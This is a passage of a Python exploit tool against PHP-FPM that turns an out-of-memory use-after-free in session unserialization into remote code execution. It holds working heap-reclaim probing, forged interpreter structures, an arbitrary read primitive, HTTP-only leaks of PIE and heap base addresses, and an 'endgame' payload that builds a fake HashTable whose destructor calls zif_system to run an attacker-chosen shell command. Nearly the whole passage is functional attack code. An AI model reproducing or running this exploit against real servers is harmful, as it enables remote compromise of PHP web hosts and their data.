    print(f"[*] chain worker before: {worker}")

    # pre-RINIT OOM: big multipart POST to index.php (no session, body parse
    # happens inside php_request_startup -> bailout -> FPM_EXIT_SOFTWARE)
    parts = [{"name": f"p{i:04d}", "data": b"V" * (1 << 20)} for i in range(10)]
    status, _h, body = chain.post_multipart(parts, b"PRERINIT1", timeout=60.0)
    time.sleep(0.4)
    worker2 = find_pool_worker(version, "chain")
    print(f"[A] pre-RINIT OOM:  status={status} worker {worker} -> {worker2} "
          f"({'DIED' if worker != worker2 else 'survived'}) body={body[:60]!r}")

    # post-RINIT OOM: producer (needs a big session; build one if missing)
    if not os.path.isfile(session_file(version, OOM_SID)):
        builder = builder_target(args.builder)
        print("[*] building oom session (4MB) ...")
        big_session_post(builder, OOM_SID, 4 << 20)
    worker3 = find_pool_worker(version, "chain")
    status, body = producer_get(chain, OOM_SID)
    time.sleep(0.2)
    worker4 = find_pool_worker(version, "chain")
    print(f"[B] post-RINIT OOM: status={status} worker {worker3} -> {worker4} "
          f"({'DIED' if worker3 != worker4 else 'survived'})")
    print(f"    body head: {body[:120]!r}")
    return 0


def cmd_oracle(args) -> int:
    oracle = Oracle(args.version, pool="chain")
    oracle.dump()
    return 0


def cmd_build_oom(args) -> int:
    builder = builder_target(args.builder)
    sid = args.sid.encode("latin1")
    status, _body = big_session_post(builder, sid, args.size)
    path = session_file(args.version, sid)
    size = os.path.getsize(path) if os.path.isfile(path) else -1
    print(f"builder status={status} session_file={path} size={size}")
    return 0 if size > args.size else 1


def cmd_build_ref(args) -> int:
    builder = builder_target(args.builder)
    sid = REF_SID
    status, body = ref_session_post(builder, sid)
    path = session_file(args.version, sid)
    content = b""
    if os.path.isfile(path):
        with open(path, "rb") as handle:
            content = handle.read()
    print(f"builder status={status} body={body[:40]!r}")
    print(f"session_file={path} content={content!r}")
    return 0 if b"R:2" in content else 1


def cmd_producer(args) -> int:
    chain = Target(args.base)
    sid = args.sid.encode("latin1")
    before = find_pool_worker(args.version, "chain")
    status, _headers, body = chain.get(PATHS["app"], cookie=_cookie(sid))
    time.sleep(0.2)
    after = find_pool_worker(args.version, "chain")
    print(f"producer status={status} worker {before} -> {after} "
          f"({'DIED' if before != after else 'survived'})")
    print(f"body: {body[:160]!r}")
    if args.oracle and before == after and before:
        oracle = Oracle(args.version)
        print(f"BG.data=0x{oracle.unserialize_data():x} "
              f"level={oracle.unserialize_level()}")
    return 0


def _hexdump(data: bytes, base: int, limit: int = 96) -> str:
    lines = []
    for off in range(0, min(len(data), limit), 16):
        chunk = data[off:off + 16]
        hexs = " ".join(f"{b:02x}" for b in chunk)
        lines.append(f"  0x{base + off:012x}  {hexs}")
    return "\n".join(lines)


def cmd_reclaim_probe(args) -> int:
    chain = Target(args.base)
    builder = builder_target(args.builder)
    oracle = Oracle(args.version)
    pads = ([int(x) for x in args.sweep.split(",")] if args.sweep
            else [args.pad])
    for pad in pads:
        # The producer OOM runs php_session_cancel_decode -> session_destroy,
        # which UNLINKS the OOM session file: rebuild it every iteration.
        big_session_post(builder, OOM_SID, args.size)
        producer_get(chain, OOM_SID)
        d = oracle.unserialize_data()
        level = oracle.unserialize_level()
        if not d or level != 1:
            print(f"[!] pad={pad}: stale state not armed (d=0x{d:x} level={level})")
            continue
        marker = b"PAT" + f"{pad:05d}".encode() + b"!" * 5
        big_value = (marker + b"Q" * 8214)[:8214]
        filename = (marker + b"Q" * 8214)[:8214]
        for shape in ("field", "filename", "field-first"):
            # No PHPSESSID cookie and no progress field: B must NOT decode a
            # session (a garbage forged struct would crash var_push).  The
            # reclaim allocations happen inside rfc1867 during request
            # startup; app.php then starts a fresh empty session (no decode).
            if shape == "field":
                parts: list[dict] = []
                if pad:
                    parts.append({"name": "pad", "data": b"C" * pad})
                parts.append({"name": "big", "data": big_value})
            elif shape == "filename":
                parts = [{"name": "N" * 64, "filename": filename, "data": b"x" * 8}]
            else:
                parts = []
                if pad:
                    parts.append({"name": "pad", "data": b"C" * pad})
                parts.append({"name": "big", "data": big_value})
                parts.append({"name": "N" * 64, "filename": b"f.bin", "data": b"x" * 8})
            chain.post_multipart(parts, b"PROBE16BB", timeout=60.0)
            try:
                region = oracle.read(d, 96)
            except OSError as exc:
                print(f"[!] pad={pad} shape={shape}: read d failed: {exc}")
                oracle = Oracle(args.version)
                continue
            hit = marker[:8] in region
            print(f"[*] pad={pad} shape={shape:11} d=0x{d:x} "
                  f"level={oracle.unserialize_level()} hit={'YES' if hit else 'no'}")
            if hit:
                print(_hexdump(region, d))
    return 0


def _forged_benign(param_addr: int) -> bytes:
    """8214-byte file-name content: full struct layout with data[1]=FZ long."""
    buf = bytearray(b"\x00" * 8214)
    # +0 last -> param_addr (fake var_entries lives in the param buffer)
    struct.pack_into("<Q", buf, 0, param_addr)
    # +56 entries.used_slots = 8 (so R:2 -> data[1] is inside our data[])
    struct.pack_into("<q", buf, 56, 8)
    # FZ at +0x300: IS_LONG 424242
    struct.pack_into("<Q", buf, 72 + 8, 0)  # data[1] set by caller
    struct.pack_into("<Q", buf, 0x300, 424242)
    struct.pack_into("<I", buf, 0x308, 4)   # IS_LONG
    return bytes(buf)


def _build_primitive_payload(d: int, k: int, size: int, value: int,
                             layout: dict | None = None) -> bytes:
    """Forged reclaim buffer with a benign fake zval (the calibration step).

    The buffer impersonates the freed php_unserialize_data struct: ``last``
    points at the ``entries`` block, ``entries.used_slots`` is 2 so that the
    R:2 reference of the session file resolves to ``data[1]``, and ``data[1]``
    points at a fake IS_LONG zval holding ``value``.  app.php echoes the
    value back, which proves the primitive without firing a destructor.

    PHP <= 7.3 (``layout["unserialize_data"]["legacy"]``) has no embedded
    block: ``first``/``last`` point at a separately allocated var_entries
    whose ``data[]`` comes first, so the fake block starts at the beginning
    of the reclaim buffer itself.  ``first`` has to be the address of a real
    allocation because PHP 7's var_destroy() frees every block it walks.
    """
    layout = layout or DEFAULT_LAYOUT
    uns = layout["unserialize_data"]
    zval = layout["zval"]
    forged = bytearray(size)
    entries = uns["entries"]
    data_base = entries + layout["var_entries"]["data"]
    struct.pack_into("<Q", forged, k + uns["last"], d + entries)
    struct.pack_into("<Q", forged, k + uns["first_dtor"], d + 0x400)
    struct.pack_into("<Q", forged, k + uns["last_dtor"], d + 0x400)
    struct.pack_into("<q", forged, k + uns["max_depth"], 64)
    struct.pack_into("<q", forged, k + entries + layout["var_entries"]["used_slots"], 2)
    struct.pack_into("<Q", forged, k + data_base + 8, d + 0x300)
    struct.pack_into("<Q", forged, k + 0x300, value)
    struct.pack_into("<I", forged, k + 0x300 + zval["type_info"], 4)
    struct.pack_into("<q", forged, k + 0x400, 0)
    return bytes(forged)


def _build_leak_payload(d: int, k: int, size: int, read_len: int,
                        layout: dict | None = None) -> bytes:
    """Forged reclaim buffer that turns the stale ``r`` into a long OOB string.

    The string-slot leak needs the freed k1 slot to be reused by the reclaim
    buffer, which depends on the allocator of the build.  This variant does
    not: R:2 resolves to a fake IS_STRING zval planted next to the fake
    struct, whose zend_string also lives inside the reclaim buffer, so
    echoing ``r`` dumps ``read_len`` bytes starting inside the buffer and
    running through the chunk.  Only the reclaim geometry (which the same
    sweep discovers) is required.
    """
    layout = layout or DEFAULT_LAYOUT
    uns = layout["unserialize_data"]
    zval = layout["zval"]
    string = layout["zend_string"]
    ve = layout["var_entries"]
    forged = bytearray(size)
    entries = uns["entries"]
    data_base = entries + ve["data"]
    struct.pack_into("<Q", forged, k + uns["last"], d + entries)
    struct.pack_into("<Q", forged, k + uns["first_dtor"], d + 0x600)
    struct.pack_into("<Q", forged, k + uns["last_dtor"], d + 0x600)
    struct.pack_into("<q", forged, k + uns["max_depth"], 64)
    struct.pack_into("<q", forged, k + entries + ve["used_slots"], 2)
    struct.pack_into("<Q", forged, k + data_base + 8, d + 0x300)
    struct.pack_into("<q", forged, k + 0x600, 0)      # empty dtor list
    # fake zval at d+0x300: IS_STRING_EX -> forged zend_string at d+0x400
    struct.pack_into("<Q", forged, k + 0x300, d + 0x400)
    struct.pack_into("<I", forged, k + 0x300 + zval["type_info"], 0x106)
    # forged zend_string at d+0x400: the read starts right after its header
    struct.pack_into("<I", forged, k + 0x400 + string["gc"], 1)
    struct.pack_into("<I", forged, k + 0x400 + string["gc"] + 4, 6)
    struct.pack_into("<Q", forged, k + 0x400 + string["len"], read_len)
    content_off = k + 0x400 + string["val"]
    fill = min(read_len, size - content_off)
    if fill > 0:
        forged[content_off:content_off + fill] = b"Q" * fill
    return bytes(forged)


def _remote_leak_probe(base: str, builder: str, version: str, chunk: int,
                       d_off: int, k: int, size: int, pads: list[int],
                       read_len: int | None = None) -> bytes | None:
    """Consume with the direct-leak payload and return the reflected bytes."""
    chainapp = Target(base + PATHS["app"])
    layout = _layout(version)
    read_len = read_len or LEAK_READ_LEN
    _remote_arm_and_normalize(base, builder, size, pads, size)
    forged = _build_leak_payload(chunk + d_off, k, size, read_len, layout)
    _status, _headers, body = _consume_b(chainapp, forged, pads)
    raw = _dechunk(body)
    index = raw.find(b"r\t")
    if index < 0:
        return None
    return raw[index + 2:index + 2 + read_len]


def cmd_primitive(args) -> int:
    """Arbitrary zval-read primitive: forged var_hash at stale d, session
    'php' decode of the ref session, R:2 -> var_access(1) reads a fake
    IS_LONG zval planted inside the reclaim buffer -> reflected by app.php.

    Reclaim geometry (lab 8.4.26, calibrated at runtime via the oracle):
    3 pad fields of 4096 + one big field of SIZE=16384 place a buffer that
    covers d at content offset K (probed with a marker run against a 404
    endpoint).  The consumer B MUST carry a file part after the progress
    field, otherwise rfc1867 never fires the pre-RINIT session_start and
    the decode would run post-RINIT against a memset BG.

    The per-request heap recycles the 8216-byte slot at one of two addresses;
    if the re-armed consume d differs from the probed d, retry (the pair
    stabilizes after at most one mismatch)."""
    base = Target(args.base)
    chain404 = Target(args.base + PATHS["probe"])
    chainapp = Target(args.base + PATHS["app"])
    builder = builder_target(args.builder)
    oracle = Oracle(args.version)
    pads = _reclaim_pads(args.version, getattr(args, "reclaim_pads", None))
    layout = _layout(args.version)
    size = int(getattr(args, "reclaim_size", 0) or 16384)
    need = 0x440

    for _attempt in range(8):
        try:
            d = _arm_stale(base, builder, oracle, args.size)
            k = _probe_cover(chain404, oracle, d, need, size, pads)
            if k is None:
                # the recycled struct alternates between two slots; the
                # reclaim buffer only covers one of them per attempt
                time.sleep(0.3)
                continue
            d2 = _rebuild_ref_and_arm(base, builder, oracle, args.size)
        except (RuntimeError, OSError) as exc:
            print(f"[!] {exc}; refreshing oracle")
            time.sleep(0.4)
            try:
                oracle = Oracle(args.version)
            except RuntimeError as oracle_exc:
                print(f"[!] {oracle_exc}")
                return 1
            continue
        if d2 != d:
            print(f"[*] slot moved 0x{d:x} -> 0x{d2:x}, retrying")
            continue
        forged = _build_primitive_payload(d, k, size, args.value, layout)

        status, _h, body = _consume_b(chainapp, forged, pads)
        text = body.decode("latin1", "replace")
        print(f"    body: {text[:300]!r}")
        needle = str(args.value).encode()
        ok = needle in body
        print(f"[*] primitive {'OBSERVABLE' if ok else 'not observable'}")
        return 0 if ok else 1
    print("[!] reclaim slot never stabilized")
    return 1


def _build_endgame_payload(d: int, k: int, size: int, zif: int,
                           command: bytes,
                           layout: dict | None = None) -> bytes:
    """Build the forged reclaim buffer for the endgame chain.

    Layout (content offsets from K; every absolute address is d-relative):
      K+0x000  decode-time php_unserialize_data (last=&entries, used_slots=2)
      K+0x300  fake zval IS_REFERENCE -> d+0x500
      K+0x400  fake var_dtor_entries (used_slots=0)
      K+0x500  fake zend_reference (rc forged 0; val = fake array zval)
      K+0x700  fake HashTable (rc 1, pDestructor = zif_system)
      K+0x800  fake Bucket doubling as the zif_system execute_data frame
      K+0x880  fake zend_string holding the command
      K+0x8F0  writable scratch for the zif_system return_value

    The struct offsets inside the fake objects come from the profile's
    "layout" section, which is generated from the build's own headers: the
    zend_array / zend_reference / zend_execute_data layouts moved between
    PHP releases.
    """
    layout = layout or DEFAULT_LAYOUT
    forged = bytearray(size)
    uns = layout["unserialize_data"]
    zval = layout["zval"]
    array = layout["zend_array"]
    ref = layout["zend_reference"]
    string = layout["zend_string"]
    frame = layout["zend_execute_data"]
    ve = layout["var_entries"]
    # decode-time forged struct (identical to the primitive)
    entries = uns["entries"]
    data_base = entries + ve["data"]
    struct.pack_into("<Q", forged, k + uns["last"], d + entries)
    struct.pack_into("<Q", forged, k + uns["first_dtor"], d + 0x400)
    struct.pack_into("<Q", forged, k + uns["last_dtor"], d + 0x400)
    struct.pack_into("<q", forged, k + uns["max_depth"], 64)
    struct.pack_into("<q", forged, k + entries + ve["used_slots"], 2)
    struct.pack_into("<Q", forged, k + data_base + 8, d + 0x300)
    struct.pack_into("<q", forged, k + 0x400, 0)      # fake dtor used_slots
    # fake zval at d+0x300: IS_REFERENCE -> fake ref at d+0x500
    struct.pack_into("<Q", forged, k + 0x300, d + 0x500)
    struct.pack_into("<I", forged, k + 0x300 + zval["type_info"], 0x10A)
    # fake zend_reference at d+0x500: rc forged 0; ZVAL_COPY addrefs -> 1
    struct.pack_into("<I", forged, k + 0x500 + ref["gc"], 0)
    struct.pack_into("<I", forged, k + 0x500 + ref["gc"] + 4, 10)  # IS_REFERENCE
    struct.pack_into("<Q", forged, k + 0x500 + ref["val"], d + 0x700)
    struct.pack_into("<I", forged, k + 0x500 + ref["val_type_info"], 0x307)
    # zend_reference.sources exists from PHP 7.3 on; PHP 7.0-7.2 layouts
    # record it as null and the reference simply ends after "val".
    if ref.get("sources") is not None:
        struct.pack_into("<Q", forged, k + 0x500 + ref["sources"], 0)
    # fake HashTable at d+0x700: rc 1; session dtor delrefs -> 0 -> fire
    struct.pack_into("<I", forged, k + 0x700 + array["gc"], 1)
    struct.pack_into("<I", forged, k + 0x700 + array["gc"] + 4, 7)   # IS_ARRAY
    struct.pack_into("<I", forged, k + 0x700 + array["flags"], 0x10)  # STATIC_KEYS
    struct.pack_into("<I", forged, k + 0x700 + array["nTableMask"], 0xFFFFFFF8)
    struct.pack_into("<Q", forged, k + 0x700 + array["arData"], d + 0x800)
    struct.pack_into("<I", forged, k + 0x700 + array["nNumUsed"], 1)
    struct.pack_into("<I", forged, k + 0x700 + array["nNumOfElements"], 1)
    struct.pack_into("<I", forged, k + 0x700 + array["nTableSize"], 8)
    struct.pack_into("<Q", forged, k + 0x700 + array["pDestructor"], zif)
    # fake Bucket at d+0x800 doubling as the zif_system execute_data frame:
    # bucket.val = IS_STRING -> fake zend_string; the frame's return_value
    # points at writable scratch; num_args=1; arg1 zval points at the
    # fake zend_string holding the command.
    struct.pack_into("<Q", forged, k + 0x800, d + 0x880)  # val.str / opline
    struct.pack_into("<I", forged, k + 0x800 + zval["type_info"], 6)
    struct.pack_into("<Q", forged, k + 0x800 + frame["return_value"], d + 0x8F0)
    struct.pack_into("<H", forged, k + 0x800 + frame["num_args"], 1)
    struct.pack_into("<Q", forged, k + 0x800 + frame["arg1"], d + 0x880)
    struct.pack_into("<I", forged, k + 0x800 + frame["arg1"] + zval["type_info"],
                     0x106)
    # fake zend_string at d+0x880: command (NUL from the zero-filled buffer)
    struct.pack_into("<I", forged, k + 0x880 + string["gc"], 1)
    struct.pack_into("<I", forged, k + 0x880 + string["gc"] + 4, 6)  # IS_STRING
    struct.pack_into("<Q", forged, k + 0x880 + string["len"], len(command))
    forged[k + 0x880 + string["val"]:
           k + 0x880 + string["val"] + len(command)] = command
    return bytes(forged)


def cmd_endgame(args) -> int:
    """RCE through a forged HashTable destructor (same reclaim pipeline as
    the primitive; only the fake zval payload changes).

    The fake zval consumed by R:2 is IS_REFERENCE -> fake zend_reference
    (forged rc=0) -> fake IS_ARRAY zval -> fake HashTable with
    pDestructor = zif_system.  The consume's ZVAL_COPY addrefs the fake
    ref 0 -> 1 (the session 'r' entry becomes the only dtored owner; the
    fake zval at d+0x300 is a silent second owner that never gets dtored).
    At consumer-B request rshutdown the session dtor delrefs 1 -> 0 and
    the dtor chain fires:

      zend_reference_destroy(ref)
        i_zval_ptr_dtor(&ref->val)           fake array zval (rc 1 -> 0)
          zend_array_destroy(ht)
            zend_hash_destroy(ht)            pDestructor != ZVAL_PTR_DTOR
              ht->pDestructor(&bucket.val)   = zif_system(fake frame)

    zif_system receives the fake execute_data frame in RDI (the bucket at
    E doubles as the frame: num_args=1 at E+0x2C, arg1 zval at E+0x50
    pointing at a fake zend_string holding the command).  php_exec runs
    the command via popen; the RETVAL write through the bogus RSI
    return_value pointer and the interior efree then abort the worker -
    acceptable: the proof file is already on disk and FPM respawns the
    worker.

    The save that precedes the fire (php_session_flush at rshutdown)
    serializes the fake ref/array safely: php_add_var_hash addrefs the
    fake ref (1 -> 2) and the serialize-var_hash destroy delrefs it back
    (2 -> 1); plain arrays are never addref'd."""
    command = args.command.encode("latin1")
    if not command or b"\x00" in command:
        print("[!] command must be non-empty and contain no NUL bytes")
        return 1
    # fake zend_string at d+0x880 (val at +24) must fit below the scratch
    # zval at d+0x8F0
    if len(command) > 0x57:
        print(f"[!] command too long ({len(command)} > 87 bytes)")
        return 1
    proof = (args.proof_file or "out/p1").lstrip("/")
    base = Target(args.base)
    chain404 = Target(args.base + PATHS["probe"])
    chainapp = Target(args.base + PATHS["app"])
    builder = builder_target(args.builder)
    oracle = Oracle(args.version)
    pads = _reclaim_pads(args.version, getattr(args, "reclaim_pads", None))
    layout = _layout(args.version)
    size = int(getattr(args, "reclaim_size", 0) or 12288)
    need = 0x900

    local_proof = os.path.join(LAB, "webroot", proof)
    with contextlib.suppress(OSError):
        os.remove(local_proof)

    worker_before = find_pool_worker(args.version, "chain")
    for _attempt in range(8):
        try:
            d = _arm_stale(base, builder, oracle, args.size)
            k = _probe_cover(chain404, oracle, d, need, size, pads)
            if k is None:
                # the recycled struct alternates between two slots; the
                # reclaim buffer only covers one of them per attempt
                print("[*] probe found no cover; retrying")
                time.sleep(0.3)
                continue
            d2 = _rebuild_ref_and_arm(base, builder, oracle, args.size)
        except (RuntimeError, OSError) as exc:
            # a dead worker (stale /proc pid) or a missed arm: rebuild the
            # oracle against the respawned worker and retry
            print(f"[!] {exc}; refreshing oracle")
            time.sleep(0.4)
            try:
                oracle = Oracle(args.version)
            except RuntimeError as oracle_exc:
                print(f"[!] {oracle_exc}")
                return 1
            continue
        if d2 != d:
            print(f"[*] slot moved 0x{d:x} -> 0x{d2:x}, retrying")
            continue
        forged = _build_endgame_payload(d, k, size, oracle.zif, command, layout)

        status, _h, _body = _consume_b(chainapp, forged, pads)
        print(f"[*] command {command!r} fired (status={status}); waiting for "
              f"worker respawn ...")
        break
    else:
        print("[!] reclaim slot never stabilized; falling back to the "
              "no-oracle geometry")
        return cmd_no_oracle(args)

    time.sleep(0.8)
    worker_after = find_pool_worker(args.version, "chain")
    print(f"[*] chain worker {worker_before} -> {worker_after} "
          f"({'died after fire' if worker_before != worker_after else 'still alive'})")
    for _attempt in range(5):
        pstatus, _ph, pbody = base.get("/" + proof)
        if pstatus == 200 and pbody:
            print(f"[+] RCE proof via /{proof}: {pbody[:120]!r}")
            return 0
        time.sleep(0.4)
    print(f"[!] no proof at /{proof} (last status={pstatus})")
    return 1


def _scan_pattern(oracle: Oracle, pattern: bytes) -> int | None:
    for start, end, perms in oracle.maps:
        if "rw-p" not in perms or end - start != MEM_CHUNK:
            continue
        try:
            data = oracle.read(start, end - start)
        except OSError:
            continue
        off = data.find(pattern)
        if off >= 0:
            return start + off
    return None


def _zif_offset(version: str) -> int:
    path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
    with open(path, encoding="utf-8") as handle:
        return int(json.load(handle)["libphp"]["zif_system"], 16)


def _no_oracle_geometry(
        version: str) -> tuple[int, list[tuple[int, int]], list[int]]:
    # the shape proven on every verified build: two 4 KB pads and a 16 KB
    # reclaim, over the two slots the 8216-byte struct recycles between
    fallback = (16384, [(0x7F000, 0xFE8), (0x80000, 0xFE8),
                        (0x81000, 0xFE8), (0x82000, 0x1FE8),
                        (0x7F000, 0x1FE8), (0x80000, 0x1FE8)],
                [4096, 4096])
    path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
    try:
        with open(path, encoding="utf-8") as handle:
            fpm = json.load(handle)["fpm"]
        section = fpm["no_oracle"]
        # the single-surface amplifier arm leaves the heap in a different
        # shape than the classic two-surface arm: when calibrated, its
        # slots live in fpm.growth and win in growth mode
        growth = fpm.get("growth") or {}
        if ARM_MODE == "growth":
            section = {**section,
                       **{key: growth[key] for key in
                          ("candidates", "reclaim_pads", "reclaim_size")
                          if key in growth}}
        return (int(section["reclaim_size"]),
                [(int(c["d_off"], 16), int(c["k"], 16))
                 for c in section["candidates"]],
                [int(x) for x in section.get("reclaim_pads",
                                             fpm["reclaim_pads"])])
    except (OSError, KeyError, TypeError, ValueError):
        return fallback


def _leak_geometry(version: str, mode: str | None = None) -> dict | None:
    path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
    try:
        with open(path, encoding="utf-8") as handle:
            fpm = json.load(handle)["fpm"]
        mode = mode or ARM_MODE
        # growth mode reads the amplifier arm's leak geometry when the
        # build has one; the offsets shift with the arm's heap footprint
        leak = ((fpm.get("growth") or {}).get("leak")
                if mode == "growth" else None) or fpm["leak"]
    except (OSError, KeyError, TypeError):
        return None
    try:
        return {
            "arm_path": str(leak["arm_path"]),
            "pads": [int(x) for x in leak["pads"]],
            "size": int(leak["size"]),
            "header_content_off": int(leak["header_content_off"], 16),
            "read_len": int(leak["read_len"], 16),
            "chunk_ptr_off": int(leak["chunk_ptr_off"], 16),
            "chunk_base_off": int(leak["chunk_base_off"], 16),
            "pie_ptr_off": int(leak["pie_ptr_off"], 16),
            "pie_base_off": int(leak["pie_base_off"], 16),
        }
    except (KeyError, TypeError, ValueError):
        return None


def _dechunk(body: bytes) -> bytes:
    """Decode an HTTP chunked body; return it unchanged when not chunked."""
    if not re.match(rb"^[0-9a-fA-F]+\r\n", body):
        return body
    out = bytearray()
    pos = 0
    while pos < len(body):
        eol = body.find(b"\r\n", pos)
        if eol < 0:
            break
        try:
            size = int(body[pos:eol], 16)
        except ValueError:
            return body
        pos = eol + 2
        if size == 0:
            break
        out += body[pos:pos + size]
        pos += size
        if body[pos:pos + 2] == b"\r\n":
            pos += 2
    return bytes(out)


def _leak_read(base_url: str, builder_url: str, version: str, geom: dict,
               attempts: int = 3) -> bytes | None:
    """One stale-string OOB read with an explicit geometry; HTTP only.

    ``geom`` only needs arm_path/pads/size/header_content_off/read_len, so
    the same request runs both with the calibrated geometry of a profile and
    with a candidate geometry while one is being discovered.
    """
    chain = Target(base_url)
    app = Target(base_url + PATHS["app"])
    builder = builder_target(builder_url)
    size = geom["size"]
    read_len = geom["read_len"]
    header = geom["header_content_off"]
    # Tile the reclaim buffer with the read length instead of planting one
    # header at a calibrated offset.  The stale zval points at the arm's
    # freed short string; wherever that slot lands INSIDE this buffer, the
    # zend_string it aliases must carry a sane length, otherwise an
    # uncalibrated build reads a garbage length and can crash the worker
    # (observed on 7.4.33).  The read always starts at the stale string's
    # own body, so profiles calibrated with a single header keep their
    # offsets: for them this is the same bytes at the same place.
    content = bytearray(struct.pack("<Q", read_len) * (size // 8 + 8))
    content = content[:size]
    if header + 0x18 <= size:    # keep the recorded offset meaningful too
        struct.pack_into("<I", content, header, 0x40000000)      # refcount
        struct.pack_into("<I", content, header + 4, 6)           # IS_STRING
        struct.pack_into("<Q", content, header + 8, 0)           # h
        struct.pack_into("<Q", content, header + 0x10, read_len) # len
    parts = [{"name": f"pad{i}", "data": b"C" * pad}
             for i, pad in enumerate(geom["pads"])]
    parts.append({"name": "big", "data": bytes(content)})
    parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"})
    parts.append({"name": "f", "filename": "a.txt", "data": b"x" * 8})
    for attempt in range(attempts):
        if attempt:
            time.sleep(0.25)
            # A reset request after a killed worker clears stale session/lock
            # state; without it a post-fire leak can fail on an otherwise
            # healthy respawned worker.  It only belongs after an attempt
            # that could have killed the worker: on a fresh arm the extra
            # request shifts the heap just enough to change where the arm's
            # freed short string lands (observed on a foreign checkout).
            with contextlib.suppress(OSError):
                ref_session_post(builder, REF_SID)
                app.get(PATHS["app"], cookie=_cookie(REF_SID))
        try:
            if ARM_MODE == "growth":
                # On a single pool every request that reaches RINIT clears the
                # stale state, so the reference rebuild runs *before* the
                # growth arm and nothing sits between the arm and the consume.
                ref_session_post(builder, REF_SID)
                _remote_arm(base_url, builder_url, 4 << 20)
            else:
                builder.get(geom["arm_path"], cookie=_cookie(OOM_SID))
                chain.get(PATHS["app"], cookie=_cookie(OOM_SID))
                ref_session_post(builder, REF_SID)
            # the fan-out mirrors no-oracle: the leak read only works on the
            # worker that carries the stale state, so try every worker
            for _fan in range(WORKERS):
                _status, _headers, body = app.post_multipart(
                    parts, b"HTTPLEAK", cookie=_cookie(REF_SID),
                    timeout=180.0)
                raw = _dechunk(body)
                idx = raw.find(b"r\t")
                if os.environ.get("PHP2SHELL_DEBUG"):
                    seg = raw[idx:idx + 16] if idx >= 0 else b""
                    print(f"[debug] leak attempt={attempt} fan={_fan} "
                          f"status={_status} len={len(raw)} r_idx={idx} "
                          f"seg={seg!r}")
                if idx < 0:
                    continue
                read = raw[idx + 2:idx + 2 + read_len]
                if len(read) >= read_len:
                    if os.environ.get("PHP2SHELL_DEBUG"):
                        off = geom.get("chunk_ptr_off")
                        v = (struct.unpack_from("<Q", read, int(off, 16))[0]
                             if off else None)
                        print(f"[debug] full read len={len(read)} "
                              f"chunk_ptr={v and hex(v)}")
                    return read
        except (OSError, RuntimeError, TimeoutError):
            continue
    return None


def leak_bases_http(base_url: str, builder_url: str, version: str,
                    arm_path: str | None = None) -> tuple[int, int]:
    """Leak PIE and Zend-MM chunk bases over HTTP only.

    The stale short-session string is pointed at a forged zend_string
    header in a reclaimed big field.  Its length spans the stale zval
    array (chunk pointer) and the execute_ex handler table (PIE pointer).
    The leak read is repeated because the worker aborts after answering.
    """
    geom = _leak_geometry(version)
    if geom is None:
        raise RuntimeError(f"no HTTP leak geometry for PHP {version}")
    if arm_path:
        geom = dict(geom, arm_path=arm_path)
    for attempt in range(10):
        if attempt:
            time.sleep(0.25)
        read = _leak_read(base_url, builder_url, version, geom, attempts=1)
        if read is None:
            continue
        try:
            chunk_ptr = struct.unpack_from("<Q", read,
                                           geom["chunk_ptr_off"])[0]
            pie_ptr = struct.unpack_from("<Q", read,
                                         geom["pie_ptr_off"])[0]
        except struct.error:
            continue
        chunk = chunk_ptr - geom["chunk_base_off"]
        pie = pie_ptr - geom["pie_base_off"]
        if not (0x700000000000 <= chunk_ptr < 0x800000000000):
            continue
        if not (0x550000000000 <= pie_ptr < 0x570000000000):
            continue
        if chunk & 0x1fffff or pie & 0x1fffff:
            continue
        if chunk_ptr & 0xfff:
            continue
        print(f"[*] HTTP leak attempt {attempt}: "
              f"chunk=0x{chunk:x} pie=0x{pie:x}")
        return pie, chunk
    raise RuntimeError("HTTP leak failed (all reads short or invalid)")


# content offsets of the forged zend_string header tried while discovering
# the leak geometry of a build (the 8.4.x value first)
LEAK_HEADER_GRID = (0x17E8, 0x16E8, 0x18E8, 0x15E8, 0x19E8, 0x1000,
                    0x1200, 0x1400, 0x1A00, 0x1C00, 0x2000, 0x2400,
                    0x2800, 0x3000)
LEAK_READ_LEN = 0x1C000
# Offsets of the executable (r-x) mapping inside a PHP build.  The binary
# starts with one 2MB read-only page and its code spans a few MB after it
# (5.3 MB on 8.2, 4.9 MB on 8.4).  Anything a base candidate has to explain
# outside of this window is not a code pointer: on systems where the brk
# heap sits in the same numeric range as PIE (0x55/0x56), stale heap
# values are stable across two reads as well, and this window is what tells
# them apart without spending a request.
PIE_CODE_WINDOW = (0x200000, 0x600000)


def _scan_pointers(read: bytes) -> tuple[list[tuple[int, int]],
                                         list[tuple[int, int]]]:
    """(offset, value) pairs of chunk- and PIE-range pointers in a leak."""
    chunk_ptrs: list[tuple[int, int]] = []
    pie_ptrs: list[tuple[int, int]] = []
    for off in range(0, len(read) - 8, 8):
        value = struct.unpack_from("<Q", read, off)[0]
        if 0x700000000000 <= value < 0x800000000000 and not value & 0xFFF:
            chunk_ptrs.append((off, value))
        elif 0x550000000000 <= value < 0x570000000000:
            pie_ptrs.append((off, value))
    return chunk_ptrs, pie_ptrs


# (pads, size) shapes tried while discovering the leak geometry.  Where the
# freed short-string slot lands depends on the allocator of the build - and
# on PHP 7.x the page recycling differs enough that the 8.4-era shapes miss
# entirely - so the sweep walks pad/size combinations of increasing pressure.
# A miss is cheap with the tiled content: the read comes back short instead
# of crashing the worker.
LEAK_SHAPES = (
    ([32768, 16384], 16384),
    ([32768], 16384),
    ([16384, 32768], 16384),
    ([16384, 16384], 16384),
    ([32768, 16384], 32768),
    ([65536, 32768], 32768),
    ([], 16384),
    ([4096], 16384),
    ([4096, 4096], 16384),
    ([8192, 8192], 16384),
    ([16384], 16384),
    ([16384], 32768),
    ([32768], 32768),
    ([4096, 4096], 32768),
    ([8192, 8192], 32768),
    ([32768, 16384], 24576),
    ([16384, 8192], 24576),
    ([4096, 4096, 4096], 16384),
    ([65536], 16384),
    ([65536, 16384], 32768),
    ([8192], 32768),
    ([], 32768),
)


def leak_geometry_candidates(base_url: str, builder_url: str, version: str,
                             arm_path: str = "/bigvar.php"):
    """Yield an HTTP leak geometry for every reclaim shape that is stable.

    The reclaim buffer is tiled with the read length (see _leak_read), so
    a calibrated header offset no longer decides anything: what matters is
    that the SHAPE lets the buffer overlap the arm's freed short string.
    A geometry is yielded when two reads of the same shape expose a chunk
    pointer and a PIE-range pointer at the very same offsets (the FPM
    master keeps both bases for its whole lifetime, so a stable pair is
    real).

    The sweep is round-robin, one read per shape per lap: the stale-string
    slot is allocator luck, a miss is a short read or a worker crash, and
